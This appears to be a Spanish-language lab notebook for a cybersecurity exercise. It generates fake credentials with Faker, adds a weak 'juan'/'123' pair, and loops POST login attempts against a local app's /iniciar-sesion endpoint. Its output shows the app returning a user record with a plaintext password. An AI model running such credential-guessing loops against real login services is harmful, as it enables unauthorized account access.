{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ataque Fuerza Bruta a App Ciberseguridad"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!pip install requests\n",
    "#pip install faker\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Matthew Jackson\n",
      "n!JZJ4ZMmd\n",
      "Jennifer Kennedy\n",
      "#YnVgg+M47\n",
      "Nicole Anderson\n",
      "EAEFu5Vgu&\n",
      "Javier Nichols\n",
      "wI6AKNlEM^\n",
      "Lori Cooper\n",
      "+11wC6wk$3\n",
      "Matthew Thomas\n",
      "A&3uWOowm)\n",
      "William Sherman\n",
      "52*ZMk)B%e\n",
      "George Jefferson\n",
      "O(1SLYgIza\n",
      "Jeffrey Lambert\n",
      "#0S#8j8!@P\n",
      "Kimberly Morrison\n",
      "&NUatCO0)7\n"
     ]
    }
   ],
   "source": [
    "# con faker generar 10 usuarios y 10 contraseñas\n",
    "nombres = []\n",
    "contrasenas = []\n",
    "from faker import Faker\n",
    "fake = Faker()\n",
    "for i in range(10):\n",
    "    print(fake.name())\n",
    "    nombres.append(fake.name())\n",
    "    print(fake.password())\n",
    "    contrasenas.append(fake.password())\n",
    "\n",
    "nombres.append('juan')\n",
    "contrasenas.append('123')\n",
    "\n",
    "#crear un diccionario con los usuarios y contraseñas\n",
    "diccionario = dict(zip(nombres, contrasenas))\n",
    "\n",
    "#crear un json con el diccionario\n",
    "import json\n",
    "with open('diccionarios.json', 'w') as file:\n",
    "    json.dump(diccionario, file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Oscar Hartman': '#%vMN_4uu8',\n",
       " 'Sherry Bryan': 'Uu9EN#iZ$4',\n",
       " 'Nathan Graham': '^v_C!9Ox^5',\n",
       " 'Gregory Smith': 'G4miVeKt)%',\n",
       " 'Stephanie Ramirez': 'g0f$7FOt6_',\n",
       " 'Mr. Dustin Castillo': 'J1CMS8xH_V',\n",
       " 'Michael Martinez PhD': 'V6Urbx#W#R',\n",
       " 'Richard Thompson': '@DFe)O9%%3',\n",
       " 'Joseph Fowler': 'T6D!#6JoKE',\n",
       " 'David Sutton': 'K*0BYj@i$O',\n",
       " 'juan': '123'}"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#leer diccionarios.json\n",
    "with open('diccionarios.json', 'r') as file:\n",
    "    diccionario = json.load(file)\n",
    "#crear un diccionario con los usuarios y contraseñas\n",
    "diccionario"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "peticion para el usuario:  Oscar Hartman\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Sherry Bryan\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Nathan Graham\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Gregory Smith\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Stephanie Ramirez\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Mr. Dustin Castillo\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Michael Martinez PhD\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Richard Thompson\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  Joseph Fowler\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  David Sutton\n",
      "b'{\"mensaje\":\"No se encontraron resultados\"}'\n",
      "peticion para el usuario:  juan\n",
      "b'[{\"_id\":\"6400d1399dda383664fe52a2\",\"login\":\"juan\",\"contrasena\":\"123\",\"nombre\":\"juan\",\"perfil\":1,\"correo\":\"juan@patito.com\",\"activo\":true,\"__v\":0}]'\n"
     ]
    }
   ],
   "source": [
    "#mandar una peticion post a la url http://localhost:4000/iniciar-sesion con el siguiente json {\"perfil\":\"juan\",\"password\":\"123\"}\n",
    "\n",
    "import requests\n",
    "import json\n",
    "\n",
    "url = \"http://localhost:4000/iniciar-sesion\"\n",
    "#payload = {\"perfil\":\"juan\",\"password\":\"123gato\"}\n",
    "headers = {'Content-Type': 'application/json'}\n",
    "\n",
    "for x in diccionario:\n",
    "    payload = {\"perfil\":x,\"password\":diccionario[x]}\n",
    "    response = requests.request(\"POST\", url, headers=headers, data = json.dumps(payload))\n",
    "    print(\"peticion para el usuario: \",x)\n",
    "    print(response.text.encode('utf8'))\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "5c7b89af1651d0b8571dde13640ecdccf7d5a6204171d6ab33e7c296e100e08a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
